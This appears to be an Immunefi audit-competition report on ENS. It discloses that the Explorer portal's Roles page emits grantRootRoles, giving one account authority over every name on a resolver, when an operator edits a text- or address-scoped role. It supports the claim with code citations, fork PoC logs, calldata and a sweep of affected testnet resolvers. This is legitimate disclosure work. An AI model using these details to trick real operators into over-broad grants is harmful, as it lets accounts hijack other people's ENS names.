# 92239 w a critical one ticked permission on a record scoped row makes the explorer s roles page sign grantrootroles authority over every name the resolver serves with no scope shown on any sc&#x20;

**Submitted on Sep 8th 2026 at 12:13:04 UTC by @drMurlly for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92239
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters Substituting contract addresses Submitting malicious transactions Signing or submitting a transaction against the wrong chain (for example when the request's target chain is not validated) Inducing a blanket token approval (for example setApprovalForAll on the registry or NameWrapper) to an attacker-controlled address
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves
  * Taking state-modifying authenticated actions (with or without blockchain state interaction) on behalf of other users without any interaction by that user, such as: Changing registration information Notification/settings changes

## Description

## Brief/Intro

On a local fork of Sepolia, an account whose only on-chain role is **write one text record on one name it does not own** was handed the ability to **write address records on names belonging to other people**, and — via the same one checkbox — to **replace the resolver's code and hijack every name it serves** — by signing the transaction the Explorer builds for a one-checkbox permission edit.

**Four checks, each under a minute, that settle this report.**

| # | check                                                                                                                                       | expected                                                                                          |
| - | ------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------- |
| 1 | `apps/portal/src/lib/roles/resolverRoles.ts:138-141` — the second word of the resource                                                      | the literal `ZERO_BYTES32`, JSDoc at `:134-137` *"(with part = 0)"*                               |
| 2 | `apps/portal/src/features/resolver/helpers/grantResolverRoles.ts:47-60` — the scope ternary, and `:20`, the JSDoc on the parameter it reads | `name === '' ? scope:'root' : scope:'name'`, and *"empty string for ROOT\_RESOURCE (all names)"*  |
| 3 | `EnhancedAccessControl.sol:452-455` in the deployed resolver — what a root grant reaches                                                    | `_getRoles(ROOT_RESOURCE, account) \| _getRoles(resource, account)` — every name, no fork needed  |
| 4 | `cp poc/E8-15_render_screen.test.tsx apps/portal/src/ && pnpm vitest run` — no wallet, no RPC, no chain                                     | 10 passing: Name cell `""`, no scope sentence, `grantRootRoles` 68 bytes from one ticked checkbox |

**The cause is one line.** A `PermissionedResolver` scopes a role to a **resource**, `keccak256(node ‖ part)`, with four kinds of `part`: root, a whole name, one **text key**, one **address coin type**. The Explorer models one — `resolverRoles.ts:138-141` hardcodes the second word to zero:

```
export const computeNameResource = (name) =>
  keccak256(encodePacked(['bytes32','bytes32'], [namehash(name), ZERO_BYTES32]))
```

So a role scoped to one text key produces a resource the Explorer can never compute. `buildResourceToNameMap` misses it, `groupRolesByAccount` records no name, `ResolverRolesSidebar.tsx:169` falls to `roleName = ''`, and both `grantResolverRoles.ts:47-60` and `revokeResolverRoles.ts:47-60` read that **empty display string** as `scope: 'root'`, emitting `grantRootRoles` — authority over every name the resolver serves — for one ticked checkbox.

**Nothing on screen warns, and that is a screenshot, not a reading** (`poc/E8-15_render_screen.log`, `poc/screens/`). The Name cell renders empty, the scope sentence is suppressed, and the confirmation screen reads only *"Save resolver role changes / Update roles for 0x49d037a6…"* — **the identical string whether the grant reaches one name or all of them.**

**Executed, on two resolvers, each with an A/B control from one snapshot** (Proof of Concept field, runs 1–4b). On the single-owner `0x34b1699b…` the escalation is isolated: after the grant the grantee gains `ROLE_SET_ADDR` and writes `sideloadtest26.eth`'s address record, which the correctly scoped control refuses. On `0x980ea45e…`, title read **on chain at the pinned block** from the `namegate.eth` registry (`poc/E8-15_crossowner_title.log`, §1) shows **four live names under three owners who are neither the signer nor the grantee**; the grantee wrote `investorb.namegate.eth`'s coin-60 record (owner `0x31faa2f6…`), while the control leaves it refused. *(The app's own indexer field lists eight names under six owners; it is expiry-blind — two labels had expired — so this report uses the on-chain figure of four/three throughout.)*

**And the ceiling: the same checkbox, ticking&#x20;*****Upgrade*****, replaces the resolver's code** — executed, every name then resolving to the attacker permanently (`poc/E8-15_upgrade_ceiling.log`).

**16 role groups on 10 resolvers were in this state** on 2026-09-05 (`poc/E8-15_roleconn_sweep.log`; a live-testnet floor). The indexer already publishes the fix: `ResolverDetail.namedResources` returns `{resource, name, recordKind, recordKey, coinType}` and carried an entry for **33 of the 33** flagged non-root rows — yet `namedResources` appears once in tracked sources (`git grep`), in generated types, never queried.

## Vulnerability Details

### The protocol has four role scopes; the Explorer computes one

A `PermissionedResolver` role is scoped to a **resource** = `keccak256(node ‖ part)`, returning `0` when both words are zero — that zero is `ROOT_RESOURCE` (`PermissionedResolverLib.sol:71-80`). The `part` selects granularity, and each scope's reach was **granted on a fork and measured**, not read off source (`poc/E8-15_scope_model.log`):

| scope              | `part`                         | measured reach                   |
| ------------------ | ------------------------------ | -------------------------------- |
| root               | — (`grantRootRoles`)           | every name the resolver serves   |
| name               | `bytes32(0)`                   | one name, all its records        |
| **text key**       | `keccak256(key)`               | one name, **one text record**    |
| **addr coin type** | `keccak256(bytes32(coinType))` | one name, **one address record** |

**The four scopes are documented in the code the Explorer ships against**, so the model needs no deployed-contract source. The app's own JSDoc already fixes `part = 0` as one whole name (`resolverRoles.ts:135`, *"the EAC resource ID for a name (**with part = 0**)"*). The ensjs package the Explorer imports and pins ships the rest: `@ensdomains/ensjs/src/utils/v2/roles/resolverResource.ts:15,28,40` (`computeResolverResource`/`textPart`/`addrPart`, each *"Mirrors `PermissionedResolverLib`"*), whose `:12` documents the part word `0x00…00` as *"any record type"*; and the writer's docstring (`@ensdomains/ensjs/src/actions/wallet/v2/grantResolverRoles.ts:176`) defines the scope the Explorer emits: *"`'root'`: Grant roles globally (**any name, any record type**)."* When a row is narrower than a whole name, the flow does not fall back to the whole name — it falls **forward** to every name.

**Why root reaches every name, from the contract not the fork:** `EnhancedAccessControl` ORs an account's ROOT roles into every check — `_effectiveRoles = _getRoles(ROOT_RESOURCE, account) | _getRoles(resource, account)` (`:452-455`; header at `:19-21`: *"roles granted in ROOT\_RESOURCE (0x0) automatically apply to all resources"*). So `grantRootRoles(role, account)` confers that role on every resource the resolver will ever check.

The Explorer expresses exactly one scope, and says so — `resolverRoles.ts:134-141`, `computeNameResource`, with JSDoc *"Compute the EAC resource ID for a name (**with part = 0**)"*:

```
export const computeNameResource = (name) =>                                     // :138
  keccak256(encodePacked(['bytes32','bytes32'], [namehash(name), ZERO_BYTES32])) // :140
```

The second word is a constant, so **every text-scoped and every addr-scoped role is unresolvable by construction** — two of the four scopes, always. (There is even a fifth shape the app cannot compute, `resource(0, part)` — one record key across any name — which `onlyPartRoles` also honours, `PermissionedResolver.sol:178-187`; the report's claims rest on the two measured on the fork.) These `.sol` line numbers are the Etherscan-verified deployed source — the audited repo ships no `.sol`, and nothing above rests on them: the model is measured on the fork and confirmed by the contract's own revert, whose first word on a denied `setAddr` equals `keccak256(namehash(name) ‖ bytes32(0))` recomputed locally (`poc/E8-15_fork_consequence.log`).

### From an unresolvable resource to a root-scoped transaction, hop by hop

1. `buildResourceToNameMap` (`:147-160`) seeds `ROOT → '(root)'` and then, for each node, the part-0 resource only. A text-scoped resource is not in the map.
2. `groupRolesByAccount` (`:179-221`) looks each role's on-chain `resource` up in that map and adds nothing to `resolvedNames` on a miss.
3. `ResolverRolesSidebar.tsx:169` — `const roleName = resolvedNames.find((n) => n !== '(root)') ?? ''`.
4. That string is carried, unchanged, straight to the builder — every hop inside the declared asset: `ResolverRolesSidebar.tsx:299` puts it on the pending action (`name: roleName`, and `:318` for the remove path); `:490` and `:497` pass `pendingAction.name` into the mutations; `:197,215` and `:253,268` hand it to `grantResolverRoles` / `revokeResolverRoles`; `grantResolverRoles.ts:100-102` passes it to `prepareGrantResolverRolesTransaction`. No hop inspects it, defaults it, or validates it.
5. `grantResolverRoles.ts:47-60` and `revokeResolverRoles.ts:47-60`, identically, read that empty string as `scope: 'root'`.

An empty display string is read as a scope. Nothing between step 1 and step 5 carries the role's actual resource, which was in hand the whole time.

**And the empty string is not an accident the helper might have rejected — it is documented input meaning "every name", in the audited file itself.** `grantResolverRoles.ts:20`, the JSDoc on the very parameter the sidebar fills:

```ts
/** Dotted name (e.g. "myname.eth") or empty string for ROOT_RESOURCE (all names). */
readonly name: string
```

The dependency says the same on its own side (`@ensdomains/ensjs/src/actions/wallet/v2/grantResolverRoles.ts:179-180`: *"Use `name: \"\"` for any name (equivalent to root scope)"*). So both ends of the interface treat `''` as a valid value denoting the widest scope. `ResolverRolesSidebar.tsx:169` produces that value by `?? ''` — a display fallback for "we could not resolve a name" — and hands it to a parameter whose contract is "empty means every name". The sink is not at fault: `grantResolverRolesWriteParameters` does exactly what its documented contract says. The defect is in the caller — `apps/portal` supplies the sentinel meaning *every name* as its fallback for *we could not resolve a name*.

Note step 3 skips `'(root)'` **explicitly**, so a ROOT row does not rescue a group either: the group on `0xeb22a41c…` held by `0xf6a97d82…` carries a ROOT row plus four text-scoped rows, `resolvedNames` is `['(root)']`, and `roleName` is still `''`.

**The root cause is not confined to the Roles page.** `computeNameResource` has exactly two callers in the repository (`git grep computeNameResource -- apps packages`), and the second is not administrative: `features/records/hooks/useCanEditRecords.ts:68-71` computes the part-0 resource of a name and asks the resolver `hasRoles(resource, ROLE_SET_ADDR | ROLE_SET_TEXT | …)` for the connected account (`:75-88`), then gates record editing on the answer (`:108-117`). An account delegated at **text-key scope** — genuinely authorised on chain to write that one record — is checked against the wrong resource and comes back `false`, so the Explorer withholds the editor from a delegate the contract permits. It is the same hardcoded `part`, failing in the opposite direction, on an ordinary user-facing screen.

**That second consumer is named for completeness and is not claimed as a finding**: it under-permits rather than over-permits, so nobody gains authority from it. It is set out because it establishes what the root cause is — a single expression that cannot represent two of the protocol's four scopes — rather than a quirk of one administrative screen, and because the one-line fix closes both.

### Executed, through the application's own code

`poc/E8-15_app_pipeline.ts` imports the app's `buildResourceToNameMap`, `groupRolesByAccount`, `roleToPermissions`, `computeRoleChanges` and `prepareGrantResolverRolesTransaction` unmodified, runs them over live indexer data, and evaluates `ResolverRolesSidebar.tsx:169` inline. **It writes no `scope` anywhere** — the only value it supplies for `name` is that expression's output. Result (`poc/E8-15_app_pipeline.log`):

```
account=0x49d037a6…  resolvedNames=[]  decodedRoles=["ROLE_SET_TEXT"]  roleName=""

  -> function   grantRootRoles
     args       ["1","0x49D037a6…"]        <- ROLE_SET_ADDR, EVERY name
     selector   0x072d5d77   68 bytes

CONTROL, same functions, resource map corrected:
  roleName="acmestudio.sideloadtest26.eth"
  -> function   authorizeNameRoles
     args       ["0x0a61636d6573747564696f…","1","0x49D037a6…",true]
```

### What the correct call would be, stated precisely

The row's real scope is one text key, and the app's most precise **reachable** call, `authorizeNameRoles`, is already wider than that — a whole name instead of one record. The call emitted is wider again: every name on the resolver. So the widening is two steps, not one.

It does not follow that `authorizeTextRoles` is the right call for this *edit*. The demonstrated edit ticks `ROLE_SET_ADDR`, and ensjs's text arm cannot express it — its parameter type (`grantResolverRoles.ts:64-71` in the dependency) carries `{scope:'text', name, key}` and **no `roles` field**, so that arm always grants `ROLE_SET_TEXT` for the named key. The honest statement is that the Explorer's per-account row model makes this edit **inexpressible at the row's real scope**, and the correct behaviour is therefore to refuse it or to scope it to the resource — not to widen it to root. The dependency ships the helper the app would need to do that and the app does not import it: `@ensdomains/ensjs/src/utils/v2/roles/resolverResource.ts` exports `computeResolverResource(node, part)`, `textPart` and `addrPart`.

Two of the four scopes are not merely unresolved but **unreachable**: `git grep -E 'authorizeTextRoles|authorizeAddrRoles' -- apps packages` returns **0 hits** at the pin. (`git grep` rather than `grep`, so the count is over the repository's own tracked sources and cannot be moved by a PoC file dropped into the tree.)

### Nothing on screen says so — rendered, not read

The three suppressions below are **observed in a rendered screen**: in the repository's own test runner (`poc/E8-15_render_screen.log`, in the secret gist) and again in a real browser (the four PNGs are in this report's **Attachments** field, since a gist holds text only; their sha256 sums and a description of each are in `poc/E8-15_screen_shots.log`, in the gist). Every claim below is asserted as text in the first of those, so none of it rests on the images. Each is paired with the control: the same components, the same account, the same role, the same two names, with only the role row's `resource` changed to the part-0 value the app can compute.

| where                         | text-key-scoped row (the defect)                              | part-0 row (control)                              |
| ----------------------------- | ------------------------------------------------------------- | ------------------------------------------------- |
| Name cell                     | `innerHTML` is `""`                                           | `acmestudio.sideloadtest26.eth`                   |
| sidebar scope sentence        | **the `<p>` is not in the tree**                              | *"Roles scoped to acmestudio.sideloadtest26.eth"* |
| confirmation screen           | *"Save resolver role changes / Update roles for 0x49d037a6…"* | **the identical string**                          |
| calldata handed to the wallet | `0x072d5d77` `grantRootRoles`, 68 bytes                       | `0xbbd9abb5` `authorizeNameRoles`, 196 bytes      |

The lines responsible:

* `ResolverRolesTable.tsx:68-70` — `if (names.length === 0) return null`. The Name cell is empty, not "unknown", not "(root)". (`poc/screens/1-roles-table-name-column.png`.)
* `ResolverRolesSidebar.tsx:391` — the line that would read *"Global roles (all names)"* or *"Roles scoped to …"* is gated on `resolvedNames.length > 0`. On a group whose every resource is fine-grained that array is **empty**, so the sentence is suppressed on exactly the rows where the scope is about to change. (`poc/screens/2-sidebar-no-scope-line.png` against `3-sidebar-control-scope-line.png`. A group that also holds a ROOT row has `['(root)']`, passes the gate, and does print *"Global roles (all names)"* — 2 of the 16, and the 2 where nothing new is conferred.)
* `ResolverRolesSidebar.tsx:339-349` — the transaction the modal is given carries `title: 'Save resolver role changes'` and `transactionName: 'Update roles for <account>'`. Neither mentions a scope, and **neither changes between the two branches**: the last screen before the wallet prompt is byte-for-byte the same whether the grant reaches one name or every name on the resolver (`poc/screens/4-confirmation-before-signing.png`).
* `grantResolverRoles.ts:111` — on such a row the only string the flow produces containing `(root)` is the transaction **description** (`Grant resolver roles for ${name || '(root)'}`), and it is built *after* the user has confirmed. **It is never rendered anywhere in the application**, not merely absent from the sidebar: `description` is a stored field on the transaction record (`packages/transaction-manager/src/types/transaction.types.ts:199,244`) and `git grep description -- apps/portal/src/features/transaction-manager` returns **no line at all** — no component in the modal, the overview, the info screen or the state screen reads it. The sidebar's own `(root)` strings (`:393,395`) sit inside the `resolvedNames.length > 0` block above and are therefore suppressed on exactly these rows.

An operator ticking one box on a row that says nothing about its scope has no way to learn, before signing, that the grant is about to become resolver-wide.

### The revoke direction fails the other way

*"Remove user from all roles"* on the same row takes the identical ternary and emits `revokeRootRoles` (selector `0xce156e82`), which clears the ROOT resource. The grant being displayed sits on a text-scoped resource, so it is **not** cleared: the interface reports the removal and the role remains. Built through the app's own `prepareRevokeResolverRolesTransaction` (`poc/E8-15_app_pipeline.log` §H) and **measured on the fork** (`poc/E8-15_fork_consequence.log` §4):

```
BEFORE  grantee setText(acmestudio…, 'agent_session') : ALLOWED
sent    revokeRootRoles(16, grantee)   status 0x1
AFTER   grantee setText(acmestudio…, 'agent_session') : ALLOWED
```

All 16 affected groups decode to at least one role, so `ResolverRolesSidebar.tsx:307-312` — which returns early only on `decodedRoles.length === 0` — lets the remove path proceed on every one of them (`poc/E8-15_roleconn_sweep.log` prints `PROCEEDS` 16 times, `RETURNS EARLY` 0 times). On two of the sixteen the remove path then throws instead, by the mechanism described in the sibling-defect table below; the revoke claim therefore holds over 14 of 16, and those 14 are the impact-bearing ones.

### The fix is one query field the application already has

**And the mapping is not the indexer's invention — the resolver emits it.** When a fine-grained role is first granted, `PermissionedResolver` itself publishes the resource→name→key association: `authorizeNameRoles` emits `NamedResource(resource, toName)` (`PermissionedResolver.sol:287`) and `authorizeTextRoles` emits `NamedTextResource(partResource, toName, keccak256(bytes(key)), key)` (`:320`). The indexer's `namedResources` field is the projection of those events. So what the application needs in order to name a fine-grained resource is data the protocol emits at the moment the role is created, already indexed, already typed in the app's generated schema — and never asked for.

`ResolverDetail.namedResources` returns `{resource, name, recordKind, recordKey, coinType}` — the indexer's own resource→name oracle for the fine-grained scopes. Measured rather than assumed: across the affected population it returned an entry for **33 of the 33** flagged non-root role rows, each labelled `text` or `addr` with its record key or coin type, and **0** lacked one. It carries **no** entry for a ROOT-scoped row, and none is needed there: `buildResourceToNameMap` already seeds `ROOT_RESOURCE → '(root)'` and already computes the part-0 resource of every node it is handed. The two scopes the map gets right are exactly the two `namedResources` does not have to supply, and the two it gets wrong are exactly the two it was observed to cover.

`git grep namedResources` over the whole repository at the pin returns **exactly one line**: `packages/indexer/graphql.gen.ts:927`, a generated type. (Again `git grep`, so the count is over tracked sources only.) The field is never selected, never read, never used; the app's own resolver query (`useResolverOverview.ts:66-108`) does not ask for it.

**Two changes, and the second is the one that matters.** They are stated so the shape of the fix is not in dispute, not to prescribe an implementation:

1. *Resolve the name.* Add `namedResources { resource name recordKind recordKey coinType }` to the query at `useResolverOverview.ts:66-108` and seed `buildResourceToNameMap` from it as well as from `computeNameResource`. The Name cell and the scope sentence then fill in.
2. *Stop reading a display string as a scope.* `grantResolverRoles.ts:47-60` and `revokeResolverRoles.ts:47-60` must not treat `name === ''` as `scope: 'root'`. **Even with (1) shipped this is required**, because a resource the map still cannot name would fall back to root again. The safe default is to refuse — the row's real scope is a `resource`, and the app should carry it rather than reconstruct it from a label. `@ensdomains/ensjs` already exports what a resource-scoped path needs: `computeResolverResource(node, part)`, `textPart(key)` and `addrPart(coinType)` in `utils/v2/roles/resolverResource`, none of which the app imports.

(2) alone closes this report. (1) alone does not: it narrows the population without removing the fallback.

**And (1) is genuinely not sufficient, for a reason worth measuring rather than asserting.** `groupRolesByAccount` (`:179-221`) keys on the **account** and unions every resource that account holds on the resolver into one row; the sidebar then emits **one** call built from **one** `roleName`. Counting distinct non-ROOT resources per affected group in `poc/E8-15_roleconn_sweep.log`:

```
groups holding 1 non-ROOT resource    7
                2                     3
                3                     4
                4                     2
                                     --
affected groups                       16      -> 9 of the 16 span two to four resources
```

For those nine there is no single call that expresses the row's authority at its real scope, because the row is not at one scope. So the honest statement of the remedy is in two parts, and this report claims only the second:

* **The consent half is one query field.** `namedResources` named the scope for 33 of the 33 measured rows, so the Name cell and the sidebar's scope sentence can be correct today.
* **The write half needs a per-resource editor**, using the writers `@ensdomains/ensjs` already ships (`authorizeTextRoles`, `authorizeAddrRoles`), because one row can carry several resources.

**Neither is done today — and until one of them is, the flow does not refuse, it defaults to root.** That default is the defect. A reader who concludes "fine-grained scopes are simply not implemented yet" has described the cause correctly and stopped one step short of the consequence: an unimplemented scope here does not disable the button, it widens the grant, and it does so without saying anything on screen.

The nearer-looking shortcut does not work, and is dealt with here rather than left to be raised. That same query already selects a `name` field on each role row (`useResolverOverview.ts:97`). On `0x34b1699b…` that field is `null` on all four rows — reproduced live in `poc/E8-15_app_pipeline.log` §A, which prints `name=null` 4 of 4. `namedResources` is the field that carries the answer.

### One file, three defects — why these are separate reports

`apps/portal/src/lib/roles/resolverRoles.ts` is 221 lines and three findings in this engagement touch it. A triager who sees one file may reasonably ask whether they are one report. They are not, and the test is not the file — it is whether one change closes them.

|                                | the defect                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        | the line that is wrong                                                                             | the fix                                                                                                                                                                                                                                            | the direction of harm                                                                   |
| ------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------- |
| **This report**                | a role group that resolves to no name is edited at ROOT scope                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     | `ResolverRolesSidebar.tsx:169` + the `name === ''` ternary in `grant/revokeResolverRoles.ts:47-60` | derive the scope from the role's resource, not from a display string                                                                                                                                                                               | **over-grants** — authority is widened                                                  |
| **A second defect, same file** | *"Remove user from all roles"* throws before it builds a transaction **whenever the row's bitmap decodes an `_ADMIN` name** — the encoder it feeds is ensjs's, not the app's, and its `ResolverRole` union has no `_ADMIN` member. That is **2 of the 16** measured groups; on the other **14** the button builds `revokeRootRoles` and under-revokes instead (see *The revoke direction fails the other way*). **It does not reach this report's path**: `rolesToPermissions.ts:90-95` appends `${key}_ADMIN` only when the *Admin* checkbox changes, and the demonstrated edit ticks a *Manager* permission and emits bitmap `1` (`poc/E8-15_app_pipeline.log`) | `resolverRoles.ts:24-45` — the table itself                                                        | take the table from `@ensdomains/ensjs`                                                                                                                                                                                                            | **errors on 2 of 16, under-revokes on 14 of 16** — in neither case is authority widened |
| **A third, same file**         | the node-detail sheet compares a resource hash against a node id                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  | `routes/resolver/$address/nodes.tsx:137` — `r.resource === selectedNode.id`                        | compare a resource against a resource. (`resourcesMatch` at `lib/roles/filterEventsByResource.ts:42` is *not* the fix: it is a module-private `const`, and it tests `BigInt(a) === BigInt(b)`, which cannot make a resource hash equal a node id.) | **shows nothing** — roles are never listed for a node                                   |

Three different lines, three different fixes, three different harms: one hands authority out, one refuses to act at all, one hides authority from view. Completing any of the three fixes leaves the other two exactly as they are.

**Only the first is claimed as a finding — this report.** The second is described for completeness and is NOT claimed: it does not under-revoke, it **throws**, builds no transaction, and renders the error. The third is a display defect with no security consequence and is likewise not claimed. They are set out so that nothing is held back and no part of this file is mistaken for a second submission.

Two counts in that table are worth pinning down, and one of them will not check out against the repository, so it is spelled out here. **Three tables, three lengths:**

|                                                                                       | non-admin roles named | missing, against the contract                |
| ------------------------------------------------------------------------------------- | --------------------- | -------------------------------------------- |
| the deployed `PermissionedResolverLib` (`:7-64`)                                      | **12**                | —                                            |
| `@ensdomains/ensjs`, in the audited repo (`src/utils/v2/roles/resolverRoles.ts:9-19`) | **11**                | `ROLE_CAN_NAME` (`1 << 120`)                 |
| the app (`resolverRoles.ts:24-45`, twenty entries = 10 + 10 admin)                    | **10**                | `ROLE_SET_DATA` (`1 << 36`), `ROLE_CAN_NAME` |

A reviewer who checks the count against the in-repo dependency will get **11**, not 12, and should not read that as an error here: the twelfth is `ROLE_CAN_NAME = 1 << 120` (`PermissionedResolverLib.sol:57`, *"Nybble 30: authorizes contract naming. Root-only."*), which the SDK's own table has never carried. The contract's number is 12; the SDK's is 11; the app's is 10.

And `encodeResolverRoleBitmap` is **ensjs's function, not the app's** — its `ResolverRole` union has no `_ADMIN` member, so `resolverRoleMap[role]` yields `undefined` for an `_ADMIN` name and the `|=` against a `bigint` throws.

### Why this is not a published known issue

**No listed entry describes this root cause**, and the sweep covers the **whole** published document — prose and the appended machine payload — not the prose alone. (The saved page's prose runs to line 327, whose 380-char tail carries the closing paragraph before a 50,631-char RSC payload; both are swept.) Case-insensitive counts, prose / payload: `resolver` 0/3, `resource` 0/1, `bitmap` 0/0, `access control` 0/0, `role` 6/4, `namehash`/`keccak`/`grantRootRoles` 0/0 (`poc/E8-15_term_sweep.py`, `poc/E8-15_term_sweep_2026-09-08.log`). Every hit is page furniture, not an entry: the six prose `role` hits are the Part-2 preamble, QA-01, WEB-1305 (×2) and WEB-716; the payload `resolver`/`resource` hits are two copies of the Manager-flow impact row and the ENS project description. **None of the ten terms appears in a listed entry anywhere in the file.**

**The nearest entry, QA-01, is different in three respects and its own text puts this in scope.** `Project_Details.txt:296`: *"Certain role combinations when transferring a name … cause errors when later updating profile records or setting a primary name. **A demonstrated security consequence (e.g., a role combination that grants unintended authority) would be a new finding.**"* (identical at `ENS-KNOWN-ISSUES-2026-08-14.md:241`, plus the Part-2 preamble at `:234`). QA-01 is about **transfers** (none here), its complaint is that a follow-up **errors** (here nothing errors — the transaction succeeds, which is the problem), and its fix is in the transfer path while this defect is in `computeNameResource` — QA-01 fixed in full leaves this untouched. So on either branch the finding is in scope: if it *is* a security consequence of QA-01 it is expressly new; if it is not, the door is `ALW-01` — *"Anything not listed here is in scope under the normal competition rules"* — which needs no discretion, only the sweep above.

**The audits are on record as having read this directory** — *"our audits focused on application source directories"* (`Project_Details.txt:709`), and `apps/portal/src` is application source, so the absence is measured rather than an unexamined corner. **And publication, not awareness, is the test:** *"Private known issues … are valid for a reward at their full severity … Public known issues are invalid"* (`Project_Details.txt:70-72`) — so even an unpublished internal awareness would only change which pool applies, not the severity. The repository shows no sign of awareness: `git grep -niE 'todo|fixme|hack|known issue' -- apps/portal/src/lib/roles apps/portal/src/features/resolver` returns nothing, and `resolverRoles.test.ts` never exercises `computeNameResource`, `buildResourceToNameMap`, `textPart`, `addrPart` or `computeResolverResource`.

## Impact Details

### What the operator intends, and what they sign

A resolver operator opens the Roles page and sees a row for an account. On rows whose role is scoped to a **text key** or an **address coin type**, the Name column is blank and the sidebar shows no scope line at all. The operator ticks one permission and confirms.

* **What they believe they did:** adjust one account's rights on one record of one name.
* **What the transaction does:** `grantRootRoles(role, account)` — that right, over **every name the resolver serves**.
* **What that means on chain, measured:** the grantee writes the address record of a name it held no role for. `poc/E8-15_fork_consequence.log`, branch A.

The gap is the whole resolver.

### Who does what

* **Signer:** the resolver's root-role holder — the only party who *can* grant root roles, acting on their own resolver through the interface provided for it. The Edit affordance renders only for an account passing a root-role check (`routes/resolver/$address/roles/index.tsx:41-50,86-91`).
* **Beneficiary:** the account in the row, which receives resolver-wide authority in place of a single-record grant. **It is never the signer, and the app enforces that**: `ResolverRolesSidebar.tsx:353-359` computes `canEdit = canManageRoles && !isSelf`, Save/Remove are gated on it, and rendered on a row whose account *is* the operator neither button exists (`poc/E8-15_render_screen.log`, *"the app refuses to edit the connected account's own row"*). So the grant always lands on **a second account**, and *"the admin only over-granted authority they already held"* is unavailable as a matter of the code. (In 14 of the 16 measured groups the beneficiary holds no ROOT row there at all.)
* **Seeder:** whoever created the fine-grained role. The app cannot — the Add-User name field is a selection-only combobox over the resolver's own nodes (`ResolverAddUserSheet.tsx:186,256-285`). The chain shows how they were made: `poc/E8-15_provenance.log:55,63,71` records each of the three text-scoped rows on `0x34b1699b…` created by `authorizeTextRoles(bytes,string,address,bool)` (selector `0xf2d1eb25`) — the protocol's own text-scope entrypoint, called normally. That four-argument call carries **no role bitmap**, which is why the app's per-account row model cannot express the edit at the row's real scope.

*That the app cannot create the state is not a defence.* The Roles page is a viewer and editor of **arbitrary on-chain role state** (`useResolverOverview.ts:66-108`), and an interface that renders third-party state must render it correctly. The scopes are not exotic: the deployed resolver implements four, and ENS's own `@ensdomains/ensjs` ships `computeResolverResource`/`textPart`/`addrPart` (`utils/v2/roles/resolverResource.ts:15,28,40`) and `authorizeTextRoles`/`authorizeAddrRoles` (`actions/wallet/v2/grantResolverRoles.ts:115-157`). An app that models two of its protocol's four role scopes and silently substitutes the widest for the two it cannot is defective whichever tool wrote the row.

This is a **consent defect that escalates privilege**: the operator is shown a scope, signs a different one, and a second account gains authority neither intended to move. The consequence is an inversion — **the narrower the authority an account is delegated, the wider the authority this interface then grants it**: a whole-name row is resolved and edited correctly (one such, the sweep's positive control) while the 33 rows scoped more narrowly are all unresolvable and all edited at root. The report does not assert any measured account is hostile, and nothing depends on that.

**The privileged-address exclusion (`OUT-OF-SCOPE.yaml`, "attacks&#x20;*****requiring access to*****&#x20;privileged addresses") does not bite.** The privileged party is the **victim** — the root holder is the one deceived about what they sign — and the beneficiary needs no privileged key. Read otherwise, it would bar every consent defect in an admin interface, including the programme's own already-connected-wallet Critical row, whose signer by definition holds the authority the transaction spends. What changes is not that the root holder has authority, but that a second account acquires it.

**And the call lands rather than reverting, by construction.** `grantRootRoles` needs the caller's `_ADMIN` bit, so a reader might ask whether it merely reverts (the "erroring" side of the known-issues line). It does not: **every `PermissionedResolver` this codebase deploys is initialised with `initialize(owner, 0x1111…1111, [])`** — every role and every `_ADMIN` bit to the deployer — via `apps/portal/src/features/resolver/utils/permissionedResolver.ts:21-23,42-43`, `apps/manager/src/features/migration/contracts/permissionedResolverAddress.ts:11,38`, and the smart-account path whose validator *enforces* that calldata (`packages/smart-account/src/providers/rhinestone/registration-calls.ts:241`). Observed too: the ROOT bitmaps on both demonstrated resolvers decode 20 of 20 (`poc/E8-15_bitmap_readout.log`; `poc/E8-15_crossowner_pipeline.log` §D), which is why the fork calls succeed with `status 0x1`.

### How many are in this state, and where it crosses an ownership line

**Method.** `poc/E8-15_roleconn_sweep.py` pages `roleConnection` to exhaustion, keeps every contract with a non-root resource, separates `PermissionedResolver` proxies from registries by ERC-1967 slot, and replays the app's logic. A group is flagged **iff** it holds a non-root resource *and* `roleName` evaluates to `''`. Run 2026-09-05 (`poc/E8-15_roleconn_sweep.log`): **182,113** role rows walked (of `totalCount` 182,114), 6,240 distinct contracts, 136 with a non-ROOT resource, **11** are `PermissionedResolver` proxies, 29 role groups on them, **16 affected across 10 distinct resolvers** — 14 text-key-only, 2 both text and addr, 0 addr-only. This is a floor on the staging indexer's Sepolia view (`wagmi.ts:67`, single chain; `packages/indexer/urql/client.ts:36`), dated and re-runnable; no mainnet is measured or claimed. Of the 136 candidates, 125 (`UserRegistry`, `WrapperRegistry`, non-proxies) were excluded rather than assumed harmless.

